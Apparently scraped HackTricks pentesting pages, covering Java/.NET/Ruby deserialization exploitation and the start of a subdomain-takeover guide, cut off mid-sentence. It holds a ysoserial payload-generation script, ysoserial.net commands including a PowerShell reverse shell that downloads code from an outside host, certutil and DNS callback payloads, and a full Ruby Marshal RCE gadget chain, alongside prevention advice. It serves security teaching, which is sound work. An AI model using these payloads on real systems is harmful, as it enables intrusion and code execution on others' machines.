payload you could\nuse this webpage\n.\nFeel free to use the next script to create\nall the possible code execution\npayloads for Windows and Linux and then test them on the vulnerable web page:\nimport\nos\nimport\nbase64\n# You may need to update the payloads\npayloads\n=\n[\n'BeanShell1'\n,\n'Clojure'\n,\n'CommonsBeanutils1'\n,\n'CommonsCollections1'\n,\n'CommonsCollections2'\n,\n'CommonsCollections3'\n,\n'CommonsCollections4'\n,\n'CommonsCollections5'\n,\n'CommonsCollections6'\n,\n'CommonsCollections7'\n,\n'Groovy1'\n,\n'Hibernate1'\n,\n'Hibernate2'\n,\n'JBossInterceptors1'\n,\n'JRMPClient'\n,\n'JSON1'\n,\n'JavassistWeld1'\n,\n'Jdk7u21'\n,\n'MozillaRhino1'\n,\n'MozillaRhino2'\n,\n'Myfaces1'\n,\n'Myfaces2'\n,\n'ROME'\n,\n'Spring1'\n,\n'Spring2'\n,\n'Vaadin1'\n,\n'Wicket1'\n]\ndef\ngenerate\n(\nname\n,\ncmd\n):\nfor\npayload\nin\npayloads\n:\nfinal\n=\ncmd\n.\nreplace\n(\n'REPLACE'\n,\npayload\n)\nprint\n'Generating '\n+\npayload\n+\n' for '\n+\nname\n+\n'...'\ncommand\n=\nos\n.\npopen\n(\n'java -jar ysoserial.jar '\n+\npayload\n+\n' \"'\n+\nfinal\n+\n'\"'\n)\nresult\n=\ncommand\n.\nread\n()\ncommand\n.\nclose\n()\nencoded\n=\nbase64\n.\nb64encode\n(\nresult\n)\nif\nencoded\n!=\n\"\"\n:\nopen\n(\nname\n+\n'_intruder.txt'\n,\n'a'\n).\nwrite\n(\nencoded\n+\n'\\n'\n)\ngenerate\n(\n'Windows'\n,\n'ping -n 1 win.REPLACE.server.local'\n)\ngenerate\n(\n'Linux'\n,\n'ping -c 1 nix.REPLACE.server.local'\n)\nserialkillerbypassgadgets\nYou can\nuse\nhttps://github.com/pwntester/SerialKillerBypassGadgetCollection\nalong with ysoserial to create more exploits\n. More information about this tool in the\nslides of the talk\nwhere the tool was presented:\nhttps://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1\n‚Äã\nmarshalsec\n‚Äã\nmarshalsec\ncan be used to generate payloads to exploit different\nJson\nand\nYml\nserialization libraries in Java.\nIn order to compile the project I needed to\nadd\nthis\ndependencies\nto\npom.xml\n:\n<\ndependency\n>\n<\ngroupId\n>\njavax.activation\n</\ngroupId\n>\n<\nartifactId\n>\nactivation\n</\nartifactId\n>\n<\nversion\n>\n1.1.1\n</\nversion\n>\n</\ndependency\n>\n<\ndependency\n>\n<\ngroupId\n>\ncom.sun.jndi\n</\ngroupId\n>\n<\nartifactId\n>\nrmiregistry\n</\nartifactId\n>\n<\nversion\n>\n1.2.1\n</\nversion\n>\n<\ntype\n>\npom\n</\ntype\n>\n</\ndependency\n>\nInstall maven\n, and\ncompile\nthe project:\nsudo\napt-get\ninstall\nmaven\nmvn clean package\n-DskipTests\nFastJSON\nRead more about this Java JSON library:\nhttps://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html\n‚Äã\nLabs\nIf you want to test some ysoserial payloads you can\nrun this webapp\n:\nhttps://github.com/hvqzao/java-deserialize-webapp\n‚Äã\n‚Äã\nhttps://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/\n‚Äã\nWhy\nJava LOVES sending serialized objects all over the place. For example:\nIn\nHTTP requests\n‚Äì Parameters, ViewState, Cookies, you name it.\nRMI\n‚Äì The extensively used Java RMI protocol is 100% based on serialization\nRMI over HTTP\n‚Äì Many Java thick client web apps use this ‚Äì again 100% serialized objects\nJMX\n‚Äì Again, relies on serialized objects being shot over the wire\nCustom Protocols\n‚Äì Sending an receiving raw Java objects is the norm ‚Äì which we‚Äôll see in some of the exploits to come\nPrevention\nTransient objects\nA class that implements\nSerializable\ncan implement as\ntransient\nany object inside the class that shouldn't be serializable. For example:\npublic\nclass\nmyAccount\nimplements\nSerializable\n{\nprivate\ntransient\ndouble\nprofit\n;\n// declared transient\nprivate\ntransient\ndouble\nmargin\n;\n// declared transient\nAvoid Serialization of a class that need to implements Serializable\nSome of your application objects may be forced to implement\nSerializable\ndue to their hierarchy. To guarantee that your application objects can't be deserialized, a\nreadObject()\nmethod should be declared (with a\nfinal\nmodifier) which always throws an exception:\nprivate\nfinal\nvoid\nreadObject\n(\nObjectInputStream\nin\n)\nthrows\njava\n.\nio\n.\nIOException\n{\nthrow\nnew\njava\n.\nio\n.\nIOException\n(\n\"Cannot be deserialized\"\n);\n}\nCheck deserialized class before deserializing it\nThe\njava.io.ObjectInputStream\nclass is used to deserialize objects. It's possible to harden its behavior by subclassing it. This is the best solution if:\nYou can change the code that does the deserialization\nYou know what classes you expect to deserialize\nThe general idea is to override\nObjectInputStream.html#resolveClass()\nin order to restrict which classes are allowed to be deserialized.\nBecause this call happens before a\nreadObject()\nis called, you can be sure that no deserialization activity will occur unless the type is one that you wish to allow.\nA simple example of this shown here, where the the\nLookAheadObjectInputStream\nclass is guaranteed not to deserialize any other type besides the\nBicycle\nclass:\npublic\nclass\nLookAheadObjectInputStream\nextends\nObjectInputStream\n{\n‚Äã\npublic\nLookAheadObjectInputStream\n(\nInputStream\ninputStream\n)\nthrows\nIOException\n{\nsuper\n(\ninputStream\n);\n}\n‚Äã\n/**\n* Only deserialize instances of our expected Bicycle class\n*/\n@Override\nprotected\nClass\n<\n?\n>\nresolveClass\n(\nObjectStreamClass\ndesc\n)\nthrows\nIOException\n,\nClassNotFoundException\n{\nif\n(\n!\ndesc\n.\ngetName\n().\nequals\n(\nBicycle\n.\nclass\n.\ngetName\n()))\n{\nthrow\nnew\nInvalidClassException\n(\n\"Unauthorized deserialization attempt\"\n,\ndesc\n.\ngetName\n());\n}\nreturn\nsuper\n.\nresolveClass\n(\ndesc\n);\n}\n}\nHarden All java.io.ObjectInputStream Usage with an Agent\nIf you don't own the code or can't wait for a patch, using an agent to weave in hardening to\njava.io.ObjectInputStream\nis the best solution.\nUsing this approach you can only Blacklist known malicious types and not whitelist them as you don't know which object are being serialized.\nTo enable these agents, simply add a new JVM parameter:\n-javaagent:name-of-agent.jar\nExample:\nrO0 by Contrast Security\n‚Äã\nReferences\nDeserialization and ysoserial talk:\nhttp://frohoff.github.io/appseccali-marshalling-pickles/\n‚Äã\n‚Äã\nhttps://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/\n‚Äã\n‚Äã\nhttps://www.youtube.com/watch?v=VviY3O-euVQ\n‚Äã\nTalk about gadgetinspector:\nhttps://www.youtube.com/watch?v=wPbW6zQ52w8\nand slides:\nhttps://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf\n‚Äã\nMarshalsec paper:\nhttps://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true\n‚Äã\n‚Äã\nhttps://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr\n‚Äã\n‚Äã\nhttps://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html\n‚Äã\n‚Äã\nhttps://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html\n‚Äã\nJava and .Net JSON deserialization\npaper:\nhttps://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf\n,\ntalk:\nhttps://www.youtube.com/watch?v=oUAeWhW5b8c\nand slides:\nhttps://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf\n‚Äã\nDeserialziations CVEs:\nhttps://paper.seebug.org/123/\n‚Äã\nJNDI Injection & log4Shell\nFind whats is\nJNDI Injection, how to abuse it via RMI, CORBA & LDAP and how to exploit log4shell\n(and example of this vuln) in the following page:\nJNDI - Java Naming and Directory Interface & Log4Shell\nJMS - Java Message Service\nThe\nJava Message Service\n(\nJMS\n) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer‚Äìconsumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From\nWikipedia\n).\nProducts\nThere are several products using this middleware to send messages:\nExploitation\nSo, basically there are a\nbunch of services using JMS on a dangerous way\n. Therefore, if you have\nenough privileges\nto send messages to this services (usually you will need valid credentials) you could be able to send\nmalicious objects serialized that will be deserialized by the consumer/subscriber\n.\nThis means that in this exploitation all the\nclients that are going to use that message will get infected\n.\nYou should remember that even if a service is vulnerable (because it's insecurely deserializing user input) you still need to find valid gadgets to exploit the vulnerability.\nThe tool\nJMET\nwas created to\nconnect and attack this services sending several malicious objects serialized using known gadgets\n. These exploits will work if the service is still vulnerable and if any of the used gadgets is inside the vulnerable application.\nReferences\nJMET talk:\nhttps://www.youtube.com/watch?v=0h8DWiOWGGA\n‚Äã\nSlides:\nhttps://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf\n‚Äã\n.Net\n.Net is similar to Java regarding how deserialization exploits work: The\nexploit\nwill\nabuse gadgets\nthat\nexecute\nsome interesting\ncode when\nan object is\ndeserialized\n.\nFingerprint\nWhiteBox\nSearch the source code for the following terms:\n1.\nTypeNameHandling\n2.\nJavaScriptTypeResolver\nLook for any serializers where the type is set by a user controlled variable.\nBlackBox\nYou can search for the Base64 encoded string\nAAEAAAD/////\nor any other thing that\nmay be deserialized\nin the back-end and that allows you to control the deserialized type**.** For example, a\nJSON\nor\nXML\ncontaining\nTypeObject\nor\n$type\n.\nysoserial.net\nIn this case you can use the tool\nysoserial.net\nin order to\ncreate the deserialization exploits\n. Once downloaded the git repository you should\ncompile the tool\nusing Visual Studio for example.\nIf you want to learn about\nhow does ysoserial.net creates it's exploit\nyou can\ncheck this page where is explained the ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter\n.\nThe main options of\nysoserial.net\nare:\n--gadget\n,\n--formatter\n, **\n--output\n** and\n--plugin\n.\n--gadget\nused to indicate the gadget to abuse (indicate the class/function that will be abused during deserialization to execute commands).\n--formatter\n, used to indicated the method to serialized the exploit (you need to know which library is using the back-end to deserialize the payload and use the same to serialize it)\n**\n--output\n** used to indicate if you want the exploit in\nraw\nor\nbase64\nencoded.\nNote that\nysoserial.net\nwill\nencode\nthe payload using\nUTF-16LE\n(encoding used by default on Windows) so if you get the raw and just encode it from a linux console you might have some\nencoding compatibility problems\nthat will prevent the exploit from working properly (in HTB JSON box the payload worked in both UTF-16LE and ASCII but this doesn't mean it will always work).\n**\n--plugin\n** ysoserial.net supports plugins to craft\nexploits for specific frameworks\nlike ViewState\nMore ysoserial.net parameters\n--minify\nwill provide a\nsmaller payload\n(if possible)\n--raf -f Json.Net -c \"anything\"\nThis will indicate all the gadgets that can be used with a provided formatter (\nJson.Net\nin this case)\n--sf xml\nyou can\nindicate a gadget\n(\n-g\n)and ysoserial.net will search for formatters containing \"xml\" (case insensitive)\nysoserial examples\nto create exploits:\n#Send ping\nysoserial.exe\n-g\nObjectDataProvider\n-f\nJson.Net\n-c\n\"ping -n 5 10.10.14.44\"\n-o\nbase64\n‚Äã\n#Timing\n#I tried using ping and timeout but there wasn't any difference in the response timing from the web server\n‚Äã\n#DNS/HTTP request\nysoserial.exe\n-g\nObjectDataProvider\n-f\nJson.Net\n-c\n\"nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net\"\n-o\nbase64\nysoserial.exe\n-g\nObjectDataProvider\n-f\nJson.Net\n-c\n\"certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a\"\n-o\nbase64\n‚Äã\n#Reverse shell\n#Create shell command in linux\necho\n-n\n\"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')\"\n|\niconv\n-t\nUTF-16LE\n|\nbase64\n-w0\n#Create exploit using the created B64 shellcode\nysoserial.exe\n-g\nObjectDataProvider\n-f\nJson.Net\n-c\n\"powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=\"\n-o\nbase64\nysoserial.net\nhas also a\nvery interesting parameter\nthat helps to understand better how every exploit works:\n--test\nIf you indicates this parameter\nysoserial.net\nwill\ntry\nthe\nexploit locally,\nso you can test if your payload will work correctly.\nThis parameter is helpful because if you review the code you will find chucks of code like the following one (from\nObjectDataProviderGenerator.cs\n):\nif\n(\ninputArgs\n.\nTest\n)\n{\ntry\n{\nSerializersHelper\n.\nJsonNet_deserialize\n(\npayload\n);\n}\ncatch\n(\nException\nerr\n)\n{\nDebugging\n.\nShowErrors\n(\ninputArgs\n,\nerr\n);\n}\n}\nThis means that in order to test the exploit the code will call\nserializersHelper.JsonNet_deserialize\n‚Äã\npublic\nstatic\nobject\nJsonNet_deserialize\n(\nstring str\n)\n{\nObject\nobj\n=\nJsonConvert\n.\nDeserializeObject\n<\nObject\n>\n(\nstr\n,\nnew\nJsonSerializerSettings\n{\nTypeNameHandling\n=\nTypeNameHandling\n.\nAuto\n});\nreturn\nobj\n;\n}\nIn the\nprevious code is vulnerable to the exploit created\n. So if you find something similar in a .Net application it means that probably that application is vulnerable too.\nTherefore the\n--test\nparameter allows us to understand\nwhich chunks of code are vulnerable\nto the desrialization exploit that\nysoserial.net\ncan create.\nViewState\nTake a look to\nthis POST about\nhow to try to exploit the __ViewState parameter of .Net\nto\nexecute arbitrary code.\nIf you\nalready know the secrets\nused by the victim machine,\nread this post to know to execute code\n.\nPrevention\nDon't allow the datastream to define the type of object that the stream will be deserialized to. You can prevent this by for example using the\nDataContractSerializer\nor\nXmlSerializer\nif at all possible.\nWhere\nJSON.Net\nis being used make sure the\nTypeNameHandling\nis only set to\nNone\n.\nTypeNameHandling = TypeNameHandling.None\nIf\nJavaScriptSerializer\nis to be used then do not use it with a\nJavaScriptTypeResolver\n.\nIf you must deserialise data streams that define their own type, then restrict the types that are allowed to be deserialized. One should be aware that this is still risky as many native .Net types potentially dangerous in themselves. e.g.\nSystem.IO.FileInfo\nFileInfo\nobjects that reference files actually on the server can when deserialized, change the properties of those files e.g. to read-only, creating a potential denial of service attack.\nEven if you have limited the types that can be deserialised remember that some types have properties that are risky.\nSystem.ComponentModel.DataAnnotations.ValidationException\n, for example has a property\nValue\nof type\nObject\n. if this type is the type allowed for deserialization then an attacker can set the\nValue\nproperty to any object type they choose.\nAttackers should be prevented from steering the type that will be instantiated. If this is possible then even\nDataContractSerializer\nor\nXmlSerializer\ncan be subverted e.g.\n// Action below is dangerous if the attacker can change the data in the database\nvar typename = GetTransactionTypeFromDatabase();\n‚Äã\nvar serializer = new DataContractJsonSerializer(Type.GetType(typename));\n‚Äã\nvar obj = serializer.ReadObject(ms);\nExecution can occur within certain .Net types during deserialization. Creating a control such as the one shown below is ineffective.\nvar suspectObject = myBinaryFormatter.Deserialize(untrustedData);\n‚Äã\n//Check below is too late! Execution may have already occurred.\nif (suspectObject is SomeDangerousObjectType)\n{\n//generate warnings and dispose of suspectObject\n}\nFor\nBinaryFormatter\nand\nJSON.Net\nit is possible to create a safer form of white list control using a custom\nSerializationBinder\n.\nTry to keep up-to-date on known .Net insecure deserialization gadgets and pay special attention where such types can be created by your deserialization processes.\nA deserializer can only instantiate types that it knows about\n.\nTry to keep any code that might create potential gadgets separate from any code that has internet connectivity. As an example\nSystem.Windows.Data.ObjectDataProvider\nused in WPF applications is a known gadget that allows arbitrary method invocation. It would be risky to have this a reference to this assembly in a REST service project that deserializes untrusted data.\nReferences\nJava and .Net JSON deserialization\npaper:\nhttps://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf\n,\ntalk:\nhttps://www.youtube.com/watch?v=oUAeWhW5b8c\nand slides:\nhttps://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf\n‚Äã\n‚Äã\nhttps://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp\n‚Äã\n‚Äã\nhttps://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf\n‚Äã\n‚Äã\nhttps://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization\n‚Äã\nRuby\nRuby has two methods to implement serialization inside the\nmarshal\nlibrary: first method is\ndump\nthat converts object into bytes streams\n(serialize)\n. And the second method is\nload\nto convert bytes stream to object again (\ndeserialize\n).\nRuby uses HMAC to sign the serialized object and saves the key on one of the following files:\nconfig/environment.rb\nconfig/initializers/secret_token.rb\nconfig/secrets.yml\n/proc/self/environ\nRuby 2.X generic deserialization to RCE gadget chain (more info in\nhttps://www.elttam.com/blog/ruby-deserialization/\n):\n#!/usr/bin/env ruby\n‚Äã\nclass\nGem\n::\nStubSpecification\ndef\ninitialize\n;\nend\nend\n‚Äã\n‚Äã\nstub_specification\n=\nGem\n::\nStubSpecification\n.\nnew\nstub_specification\n.\ninstance_variable_set\n(\n:\n@loaded_from\n,\n\"|id 1>&2\"\n)\n#RCE cmd must start with \"|\" and end with \"1>&2\"\n‚Äã\nputs\n\"STEP n\"\nstub_specification\n.\nname\nrescue\nnil\nputs\n‚Äã\n‚Äã\nclass\nGem\n::\nSource\n::\nSpecificFile\ndef\ninitialize\n;\nend\nend\n‚Äã\nspecific_file\n=\nGem\n::\nSource\n::\nSpecificFile\n.\nnew\nspecific_file\n.\ninstance_variable_set\n(\n:\n@spec\n,\nstub_specification\n)\n‚Äã\nother_specific_file\n=\nGem\n::\nSource\n::\nSpecificFile\n.\nnew\n‚Äã\nputs\n\"STEP n-1\"\nspecific_file\n<=>\nother_specific_file\nrescue\nnil\nputs\n‚Äã\n‚Äã\n$dependency_list\n=\nGem\n::\nDependencyList\n.\nnew\n$dependency_list\n.\ninstance_variable_set\n(\n:\n@specs\n,\n[\nspecific_file\n,\nother_specific_file\n])\n‚Äã\nputs\n\"STEP n-2\"\n$dependency_list\n.\neach\n{}\nrescue\nnil\nputs\n‚Äã\n‚Äã\nclass\nGem\n::\nRequirement\ndef\nmarshal_dump\n[\n$dependency_list\n]\nend\nend\n‚Äã\npayload\n=\nMarshal\n.\ndump\n(\nGem\n::\nRequirement\n.\nnew\n)\n‚Äã\nputs\n\"STEP n-3\"\nMarshal\n.\nload\n(\npayload\n)\nrescue\nnil\nputs\n‚Äã\n‚Äã\nputs\n\"VALIDATION (in fresh ruby process):\"\nIO\n.\npopen\n(\n\"ruby -e 'Marshal.load(STDIN.read) rescue nil'\"\n,\n\"r+\"\n)\ndo\n|\npipe\n|\npipe\n.\nprint payload\npipe\n.\nclose_write\nputs pipe\n.\ngets\nputs\nend\n‚Äã\nputs\n\"Payload (hex):\"\nputs payload\n.\nunpack\n(\n'H*'\n)[\n0\n]\nputs\n‚Äã\n‚Äã\nrequire\n\"base64\"\nputs\n\"Payload (Base64 encoded):\"\nputs Base64\n.\nencode64\n(\npayload\n)\nOther RCE chain to exploit Ruby On Rails:\nhttps://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nDependency Confusion\nNext\nNodeJS - __proto__ & prototype Pollution\nLast modified\n6mo ago"
    },
    {
        "title": "Domain/Subdomain takeover",
        "url": "https://book.hacktricks.xyz/pentesting-web/domain-subdomain-takeover",
        "text": "Domain/Subdomain takeover\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nDomain takeover\nIf you discover some domain (domain.tld) that is\nbeing used by some service inside the scope\nbut the\ncompany\nhas l\no\nst the\nownership\nof it, you can try to\nregister\nit (if cheap enough) and let know the company. If this domain is receiving some\nsensitive information\nlike a sessions cookie via\nGET\nparameter or in the\nReferer\nheader, this is for sure a\nvulnerability\n.\nSubdomain takeover\nA subdomain of the company is pointing to a\nthird-party service with a name not registered\n. If you can\ncreate\nan\naccount\nin this\nthird party service\nand\nregister\nthe\nname\nbeing in use, you can perform the subdomain take over.\nThere are several tools with dictionaries to check for possible takeovers:\n‚Äã\nhttps://github.com/EdOverflow/can-i-take-over-xyz\n‚Äã\n‚Äã\nhttps://github.com/blacklanternsecurity/bbot\n‚Äã\n‚Äã\nhttps://github.com/punk-security/dnsReaper\n‚Äã\n‚Äã\nhttps://github.com/haccer/subjack\n‚Äã\n‚Äã\nhttps://github.com/anshumanbh/tko-sub\n‚Äã\n‚Äã\nhttps://github.com/ArifulProtik/sub-domain-takeover\n‚Äã\n‚Äã\nhttps://github.com/SaadAhmedx/Subdomain-Takeover\n‚Äã\n‚Äã\nhttps://github.com/Ice3man543/SubOver\n‚Äã\n‚Äã\nhttps://github.com/m4ll0k/takeover\n‚Äã\n‚Äã\nhttps://github.com/antichown/subdomain-takeover\n‚Äã\n‚Äã\nhttps://github.com/musana/mx-takeover\n‚Äã\nScanning for Hijackable Subdomains with\nBBOT\n:\nSubdomain takeover checks are included in BBOT's default subdomain enumeration. Signatures are pulled directly from\nhttps://github.com/EdOverflow/can-i-take-over-xyz\n.\nbbot\n-t\nevilcorp.com\n-f\nsubdomain-enum\nSubdomain Takeover Generation via DNS Wildcard\nWhen DNS wildcard is used in a domain, any requested subdomain of that domain that doesn't have a different address explicitly will be\nresolved to the same information\n. This could be an A ip address, a CNAME...\nFor example, if\n*.testing.com\nis wilcarded to\n1.1.1.1\n. Then,\nnot-existent.testing.com\nwill be pointing to\n1.1.1.1\n.\nHowever, if instead of pointing to an IP address, the sysadmin point it to a\nthird party service via CNAME\n, like a\ngithub subdomain\nfor example (\nsohomdatta1.github.io\n). An attacker could\ncreate his own third party page\n(in Gihub in this case) and say that\nsomething.testing.com\nis pointing there. Because, the\nCNAME wildcard\nwill agree the attacker will be able to\ngenerate arbitrary subdomains for the domain of the victim pointing to his pages\n.\nYou can find an example of this vulnerability in the CTF write-up:\nhttps://ctf.zeyu2001.com/2022/nitectf-2022/undocumented-js-api\n‚Äã\nExploiting a Subdomain takeover\nThis information was copied from\nhttps://0xpatrik.com/subdomain-takeover/\n‚Äã\nRecently, I\nwrote\nabout subdomain takeover basics. Although the concept is now generally well-understood, I noticed that people usually struggle to grasp the risks that subdomain takeover brings to the table. In this post, I go in-depth and cover the most notable risks of\nsubdomain takeover\nfrom my perspective.\nNote: Some risks are mitigated implicitly by the cloud provider. For instance, when subdomain takeover is possible on Amazon CloudFront, there is no way you can set up TXT records to bypass SPF checks. The post, therefore, aims to provide risks on general subdomain takeover. Nevertheless, most of these apply to cloud providers as well.\nTransparency To a Browser\nTo start off, let's look at DNS resolution where CNAME is involved:\nDNS resolution\nNote that step #7 requests\nsub.example.com\nrather than\nanotherdomain.com\n. That is because the web browser is not aware that\nanotherdomain.com\neven exist. Even though CNAME record is used, the URL bar in the browser still contains\nsub.example.com\n. This is the\ntransparency\nfor the browser. If you think about that, the browser places all the trust in the DNS resolver to provide accurate information about the domain. Simplified, subdomain takeover is a DNS spoofing for one particular domain across the Internet. Why? Because any browser performing the DNS resolution on affected domain receives A record set by an attacker. The browser then happily shows whatever is received from this server (thinking that is legitimate).\nSuch a domain makes a perfect scenario for phishing. Attackers are often using\ntyposquatting\nor so-called\nDoppelganger domains\nto mimic the legitimate domain/website for phishing purposes. After an attacker takes over some legitimate domain name, it is almost impossible for a regular user to tell whether the content on the domain is provided by a legitimate party or an attacker. Let's take for instance a random bank. If one of the bank's subdomains is vulnerable to subdomain takeover, an attacker can create an HTML form which mimics the login form to the bank's internet banking system. Then, an attacker can run spear phishing or mass phishing campaign asking users to log in to and change their passwords. At this stage, the passwords are captured by an attacker who is in control of the domain in question. The URL provided in the phishing e-mail is a legitimate subdomain of a bank. Therefore users are not aware of something malicious going on. Spam filters and other security measurements are also less likely to trigger the e-mail as spam or malicious because it contains domain names with higher trust.\nIndeed, the domain name itself place a significant role in a successful campaign. Having 5th level subdomain vulnerable to subdomain takeover is much less\n\"legit\"\nthat having a 2nd level subdomain with some friendly subdomain name. I saw several instances of perfect subdomains for phishing, including:\npurchases.SOMETHING.com\nwww.SOMETHING.com\nonline.SOMETHING.com\nshop.SOMETHING.com\nAll of them vulnerable to subdomain takeover. All of them were big brands. Talking about perfect phishing?\nNevertheless, recent phishing campaigns host content on domains with long domain names that include name of the brand (see\nApple example\n). Having valid SSL certificate (more on that below), keyword in domain name and website which mimics the website of targeted brand, people tend to fall into these attacks. Think about chances with a legitimate subdomain of this brand.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nSSL Certificates\nThe attack above can be enhanced by generating a valid SSL certificate. Certificate authorities such as\nLet's Encrypt\nallow automatic verification of domain ownership by content verification:\nLet's Encrypt Flow\nThat is, if there is a specific content placed on a specific URL path, Let's Encrypt will approve the issuance of a certificate for a given domain. Since an attacker has full control over the content of the domain which is vulnerable to subdomain takeover, this verification can be done in a matter of minutes. Therefore attackers are also able to generate SSL certificate for such domain which only lowers the suspicion of a phishing attack.\nCookie Stealing\nThis goes hand-in-hand with browser transparency but has different consequences. Web browser implements many security policies to prevent malicious websites from causing harm. This includes things such as\nSame-origin policy\n. One of the primary security responsibilities of a browser is to secure saved cookies. Why? While HTTP is a stateless protocol, cookies are used to track sessions. For convenience, users often save cookies for an extended period to prevent logging in every single time. These cookies, therefore, act as a login token which is presented to the web server and the user is identified. Attacks such as\nSession hijacking\nnaturally evolved from this concept.\nThe browser automatically presents stored to cookies with every request to the domain that issued them. There is an exception to that such that cookies might be shared across subdomains (\nread here\n, also notice section 8.7). It usually happens when the website uses cookie-based\nSingle sign-on\n(SSO) system. Using SSO, a user can log in using one subdomain and share the same session token across a wide range of subdomains. The syntax for setting a regular cookie is the following:\nHTTP/1.1 200 OK\nSet-Cookie: name=value\nIf this cookie is issued by web server residing on\nexample.com\n, only this server can access this cookie later on. However, the cookie can be issued for wildcard domain (for the reasons explained above) in the following manner:\nHTTP/1.1 200 OK\nSet-Cookie: name=value; domain=example.com\nThe cookie will be included in HTTP requests to\nexample.com\nbut also to any other subdomain such as\nsubdomain.example.com\n. This behavior creates a possibility of high severity attacks using subdomain takeover. Suppose that some particular domain is using session cookies for wildcard domain. If there is one subdomain vulnerable to subdomain takeover, the only thing for gathering user‚Äôs session token is to trick him or her into visiting the vulnerable subdomain. The session cookie is automatically sent with the HTTP request.\nThe browser also implements additional security mechanisms for cookies:\nHttpOnly cookie\n‚Äî Cookies can by default be accessed by Javascript code running in the context of the website which created the cookies. Javascript can read, update, and delete the cookies.\nHttpOnly\ncookie flag (set by the web server) indicates that the particular cookie cannot be accessed by Javascript code. The only way to get it is through HTTP request and response headers.\nSecure cookie\n‚Äî When the cookie has the\nSecure\nflag set by the web server, it can be communicated back to the web server only if HTTPS is used.\nIf the domain is vulnerable to subdomain takeover, an attacker can gather cookies issued by that domain in the past just by tricking users into visiting that website. HttpOnly and Secure flags don't help since the cookie is not being accessed using Javascript and SSL certificate can be easily generated for the taken domain.\nCookie stealing using takeover was explained in bug bounty\nreport\nby Arne Swinnen. The report explains the problem with one of the\nUbiquiti Networks\nsubdomains (\nping.ubnt.com\n). This subdomain was vulnerable to subdomain takeover, pointing to unclaimed AWS CloudFront distribution. Since Ubiquiti Networks is using SSO with wildcard session cookies, all users visiting\nping.ubnt.com\ncould have their session cookies stolen. Even though this domain is pointing to AWS CloudFront, CloudFront distribution settings allow logging cookies with each request. Therefore the scenario with extracting session cookies is entirely possible even with subdomains pointing to AWS CloudFront. In 